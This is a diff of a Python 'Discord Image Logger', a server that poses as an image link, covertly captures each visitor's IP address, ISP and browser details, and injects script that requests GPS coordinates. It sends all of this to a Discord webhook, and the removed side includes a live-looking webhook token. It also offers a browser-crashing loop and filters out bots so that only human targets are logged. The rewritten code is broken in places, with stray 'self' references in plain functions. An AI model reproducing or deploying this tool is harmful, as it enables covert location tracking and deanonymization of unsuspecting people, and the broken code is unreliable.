@@ -1,188 +1,248 @@
-# Discord Image Logger (Geolocalização Aprimorada)
-# By DeKrypt | Modificado para fins educacionais
+# Discord Image Logger (Complete Edition)
+# By DeKrypt | https://github.com/dekrypted
+# Geolocation Enhancements by [Seu Nome]
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import traceback, requests, base64, httpagentparser
+import traceback
+import requests
+import base64
+import httpagentparser
 
 __app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.1"
+__description__ = "Advanced IP/Geo-Logging Utility"
+__version__ = "v3.0"
 __author__ = "DeKrypt"
 
+# ===================== CONFIGURAÇÃO PRINCIPAL =====================
 config = {
-    # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1342206713813667992/ZrCTV80NToSOpDcxy7KXmUB6wIlwYfTsKwGoGADV91vLagXObWDzp9csNQbmCmAUe04G",
-    "image": "https://i1.sndcdn.com/artworks-000349102620-mufv3v-t500x500.jpg",
+    # -------------------- CONFIG BASE --------------------
+    "webhook": "WEBHOOK_AQUI",
+    "image": "https://i.imgur.com/3kl7JMQ.png",
     "imageArgument": True,
 
-    # CUSTOMIZATION #
-    "username": "Image Logger",
-    "color": 0x00FFFF,
+    # ------------------ PERSONALIZAÇÃO -------------------
+    "username": "Geo Logger",
+    "color": 0x1ABC9C,
+    
+    # ------------------- OPÇÕES AVANÇADAS -------------------
+    "crashBrowser": {
+        "enabled": False,
+        "method": "RAM",  # RAM/LOOP
+        "message": "This browser has been pwned"
+    },
+    
+    "accurateLocation": {
+        "enabled": True,
+        "timeout": 10  # Segundos
+    },
 
-    # OPÇÕES ATUALIZADAS #
-    "accurateLocation": True,  # GPS habilitado
-    "crashBrowser": False,
     "message": {
-        "doMessage": False,
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
-        "richMessage": True,
+        "enabled": True,
+        "text": "Your IP and location have been logged.",
+        "richEmbed": True
     },
-    "vpnCheck": 1,
-    "linkAlerts": True,
-    "buggedImage": True,
-    "antiBot": 1,
+
+    "vpnCheck": {
+        "enabled": True,
+        "blockVPNs": True,
+        "alert": True
+    },
+
+    "antiBot": {
+        "enabled": True,
+        "blockHosting": True,
+        "blockCloud": True
+    },
+
     "redirect": {
-        "redirect": False,
-        "page": "https://your-link.here"
-    },
+        "enabled": False,
+        "url": "https://google.com"
+    }
 }
 
-blacklistedIPs = ("27", "104", "143", "164")
+# ===================== SISTEMA DE SEGURANÇA =====================
+BLACKLISTED_IPS = ("27.", "104.", "143.", "164.")  # Bloqueio de ASNs suspeitos
+CLOUD_PROVIDERS = ("aws", "google", "azure", "cloudflare")
 
-def botCheck(ip, useragent):
-    if ip.startswith(("34", "35")):
-        return "Discord"
-    elif useragent.startswith("TelegramBot"):
-        return "Telegram"
-    return False
+# ===================== FUNÇÕES AUXILIARES =====================
+def parse_ip(headers):
+    return (
+        headers.get("x-forwarded-for") or 
+        headers.get("x-real-ip") or 
+        "N/A"
+    )
 
-def reportError(error):
-    requests.post(config["webhook"], json={
-        "username": config["username"],
-        "content": "@everyone",
-        "embeds": [{
-            "title": "Image Logger - Error",
-            "color": config["color"],
-            "description": f"```\n{error}\n```",
-        }],
-    })
-
-# FUNÇÃO PRINCIPAL MODIFICADA AQUI ↓
-def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
-    if ip.startswith(blacklistedIPs):
-        return
-
-    bot = botCheck(ip, useragent)
-    if bot:
-        requests.post(config["webhook"], json={
-            "username": config["username"],
-            "embeds": [{
-                "title": "Image Logger - Link Sent",
-                "color": config["color"],
-                "description": f"**Link enviado em:** `{endpoint}`\n**IP:** `{ip}`\n**Plataforma:** `{bot}`",
-            }],
-        }) if config["linkAlerts"] else None
-        return
-
-    # NOVO: Sistema de geolocalização híbrido
-    location_info = {"type": "IP", "coords": "N/A", "map": "N/A"}
+def get_geo_data(ip):
     try:
-        if coords:
-            lat, lon = coords.split(',')
-            location_info.update({
-                "type": "GPS",
-                "coords": coords,
-                "map": f"https://www.google.com/maps/place/{lat}+{lon}",
-                "accuracy": "Preciso"
-            })
-        else:
-            ip_data = requests.get(f"http://ip-api.com/json/{ip}?fields=lat,lon,city,country,isp", timeout=10).json()
-            location_info.update({
-                "coords": f"{ip_data.get('lat', 'N/A')}, {ip_data.get('lon', 'N/A')}",
-                "map": f"https://www.google.com/maps?q={ip_data.get('lat',0)},{ip_data.get('lon',0)}",
-                "accuracy": "Aproximado",
-                "city": ip_data.get("city", "N/A"),
-                "country": ip_data.get("country", "N/A"),
-                "isp": ip_data.get("isp", "N/A")
-            })
+        response = requests.get(
+            f"http://ip-api.com/json/{ip}?fields=status,message,continent,country,regionName,city,zip,lat,lon,isp,org,as,mobile,proxy,hosting",
+            timeout=15
+        )
+        return response.json()
     except Exception as e:
-        reportError(f"Erro na geolocalização: {str(e)}")
+        return {"error": str(e)}
 
+def get_gps_coords(query):
+    try:
+        coords = base64.b64decode(query["g"]).decode()
+        lat, lon = coords.split(',')
+        return {
+            "latitude": float(lat),
+            "longitude": float(lon),
+            "accuracy": "High (GPS)",
+            "source": "Browser Geolocation"
+        }
+    except:
+        return None
+
+# ===================== SISTEMA DE RELATÓRIOS =====================
+def generate_embed(ip, geo_data, gps_data, user_agent):
+    # Detecção do sistema
+    os, browser = httpagentparser.simple_detect(user_agent) if user_agent else ("Unknown", "Unknown")
+    
     # Construção do embed
-    os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
     embed = {
         "username": config["username"],
         "embeds": [{
-            "title": "📍 Novo Acesso Detectado",
+            "title": "🌍 Nova Atividade Detectada",
             "color": config["color"],
             "fields": [
-                {"name": "🌐 IP", "value": f"```{ip}```", "inline": False},
-                {"name": "📌 Localização", "value": f"**Tipo:** {location_info['type']} ({location_info['accuracy']})\n**Coordenadas:** [{location_info['coords']}]({location_info['map']})", "inline": False},
-                {"name": "🏙️ Cidade", "value": location_info.get("city", "N/A"), "inline": True},
-                {"name": "🌍 País", "value": location_info.get("country", "N/A"), "inline": True},
-                {"name": "🖥️ Sistema", "value": f"{os} | {browser}", "inline": False},
+                {"name": "🌐 IP Address", "value": f"```{ip}```", "inline": False},
+                {"name": "📍 Geolocalização", "value": self._build_geo_field(geo_data, gps_data), "inline": False},
+                {"name": "🖥️ Sistema", "value": f"**OS:** {os}\n**Browser:** {browser}", "inline": True},
+                {"name": "📡 Rede", "value": self._build_network_field(geo_data), "inline": True}
             ],
-            "footer": {"text": f"User Agent: {useragent}" if useragent else ""}
+            "footer": {"text": f"User Agent: {user_agent}"}
         }]
     }
-    if url: embed["embeds"][0]["thumbnail"] = {"url": url}
-    requests.post(config["webhook"], json=embed)
+    
+    if gps_data:
+        embed["embeds"][0]["thumbnail"] = {"url": f"https://maps.googleapis.com/maps/api/staticmap?center={gps_data['latitude']},{gps_data['longitude']}&zoom=13&size=600x300"}
+    
+    return embed
 
-binaries = {
-    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-}
+def _build_geo_field(self, geo_data, gps_data):
+    if gps_data:
+        return (
+            f"**Precisão:** {gps_data['accuracy']}\n"
+            f"**Coordenadas:** [{gps_data['latitude']}, {gps_data['longitude']}]"
+            f"(https://www.google.com/maps/place/{gps_data['latitude']}+{gps_data['longitude']})\n"
+            f"**Fonte:** {gps_data['source']}"
+        )
+    return (
+        f"**País:** {geo_data.get('country', 'N/A')}\n"
+        f"**Cidade:** {geo_data.get('city', 'N/A')}\n"
+        f"**Coordenadas:** [{geo_data.get('lat', 'N/A')}, {geo_data.get('lon', 'N/A')}]"
+    )
 
-class ImageLoggerAPI(BaseHTTPRequestHandler):
-    def handleRequest(self):
+def _build_network_field(self, geo_data):
+    return (
+        f"**ISP:** {geo_data.get('isp', 'N/A')}\n"
+        f"**ASN:** {geo_data.get('as', 'N/A')}\n"
+        f"**VPN:** {'✅' if geo_data.get('proxy') else '❌'}"
+    )
+
+# ===================== SERVIDOR PRINCIPAL =====================
+class GeoLoggerAPI(BaseHTTPRequestHandler):
+    def do_GET(self):
         try:
-            url = config["image"]
-            if config["imageArgument"]:
-                query = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
-                if query.get("url") or query.get("id"):
-                    url = base64.b64decode((query.get("url") or query.get("id")).encode()).decode()
-
-            data = f'''<style>body {{margin:0;padding:0;}}
-                    div.img {{background-image:url('{url}');background-size:contain;width:100vw;height:100vh;}}</style>
-                    <div class="img"></div>'''.encode()
-
-            ip = self.headers.get('x-forwarded-for')
-            if ip.startswith(blacklistedIPs) or botCheck(ip, self.headers.get('user-agent')):
-                self.send_response(200 if config["buggedImage"] else 302)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
-                self.end_headers()
-                if config["buggedImage"]: 
-                    self.wfile.write(binaries["loading"])
-                return
-
-            # Captura GPS
-            coords = None
-            if config["accurateLocation"]:
-                query = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
-                if query.get("g"):
-                    coords = base64.b64decode(query["g"].encode()).decode()
-                else:
-                    data += b"""<script>
-                        navigator.geolocation.getCurrentPosition(p => {
-                            const coord = btoa(p.coords.latitude + ',' + p.coords.longitude).replace(/=/g, '%3D');
-                            window.location.href.includes('?') 
-                                ? window.location.href += '&g=' + coord 
-                                : window.location.href += '?g=' + coord;
-                        });
-                    </script>"""
-
-            makeReport(ip, self.headers.get('user-agent'), coords, self.path.split("?")[0], url)
+            # Processamento da URL
+            parsed_url = parse.urlsplit(self.path)
+            query = parse.parse_qs(parsed_url.query)
             
-            if config["message"]["doMessage"]:
-                data = config["message"]["message"].encode()
+            # Configuração dinâmica
+            image_url = self._get_image_url(query)
+            ip_address = parse_ip(self.headers)
+            user_agent = self.headers.get("User-Agent", "Unknown")
             
-            if config["crashBrowser"]:
-                data += b'<script>setTimeout(()=>{for(;;)Array(1e5)},100)</script>'
+            # Verificações de segurança
+            if self._is_blocked(ip_address, user_agent):
+                return self._handle_blocked_request(image_url)
             
-            if config["redirect"]["redirect"]:
-                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
-
-            self.send_response(200)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-            self.wfile.write(data)
-
+            # Coleta de dados
+            geo_data = get_geo_data(ip_address)
+            gps_data = self._get_gps_data(query)
+            
+            # Geração de resposta
+            self._send_response(image_url)
+            self._log_data(ip_address, user_agent, geo_data, gps_data)
+            
         except Exception as e:
-            self.send_response(500)
-            self.end_headers()
-            reportError(traceback.format_exc())
+            self._handle_error(e)
 
-    do_GET = handleRequest
-    do_POST = handleRequest
+    def _get_image_url(self, query):
+        if config["imageArgument"] and (query.get("url") or query.get("id")):
+            return base64.b64decode((query.get("url")[0] or query.get("id")[0]).encode()).decode()
+        return config["image"]
 
-handler = app = ImageLoggerAPI
+    def _is_blocked(self, ip, user_agent):
+        if any(ip.startswith(prefix) for prefix in BLACKLISTED_IPS):
+            return True
+        if config["antiBot"]["enabled"]:
+            return any(provider in user_agent.lower() for provider in CLOUD_PROVIDERS)
+        return False
+
+    def _handle_blocked_request(self, image_url):
+        self.send_response(302)
+        self.send_header("Location", image_url)
+        self.end_headers()
+
+    def _get_gps_data(self, query):
+        if config["accurateLocation"]["enabled"] and "g" in query:
+            return get_gps_coords(query)
+        return None
+
+    def _send_response(self, image_url):
+        content = self._build_response_content(image_url)
+        self.send_response(200)
+        self.send_header("Content-type", "text/html")
+        self.end_headers()
+        self.wfile.write(content.encode())
+
+    def _build_response_content(self, image_url):
+        if config["message"]["enabled"]:
+            return self._build_message_content()
+        return f'''<style>body{{margin:0;padding:0}}
+                  div.img{{background:url('{image_url}');background-size:contain;width:100vw;height:100vh;}}</style>
+                  <div class="img">{self._get_geo_script()}</div>'''
+
+    def _build_message_content(self):
+        message = config["message"]["text"]
+        if config["message"]["richEmbed"]:
+            message += "\n\n**Detalhes Técnicos:**\n- IP: {ip}\n- ISP: {isp}"
+        return message
+
+    def _get_geo_script(self):
+        if config["accurateLocation"]["enabled"]:
+            return '''<script>
+                navigator.geolocation.getCurrentPosition(p => {
+                    const coords = btoa(p.coords.latitude + ',' + p.coords.longitude)
+                    window.location.search += '&g=' + coords
+                }, null, {timeout:10000})
+                </script>'''
+        return ""
+
+    def _log_data(self, ip, user_agent, geo_data, gps_data):
+        embed = generate_embed(ip, geo_data, gps_data, user_agent)
+        requests.post(config["webhook"], json=embed)
+
+    def _handle_error(self, error):
+        self.send_response(500)
+        self.end_headers()
+        error_report = {
+            "username": config["username"],
+            "content": "⚠️ **Erro no Logger**",
+            "embeds": [{
+                "description": f"```{traceback.format_exc()}```",
+                "color": 0xFF0000
+            }]
+        }
+        requests.post(config["webhook"], json=error_report)
+
+# ===================== INICIALIZAÇÃO =====================
+if __name__ == "__main__":
+    from http.server import HTTPServer
+    server = HTTPServer(("0.0.0.0", 8080), GeoLoggerAPI)
+    print(f"Servidor iniciado em http://0.0.0.0:8080")
+    server.serve_forever()
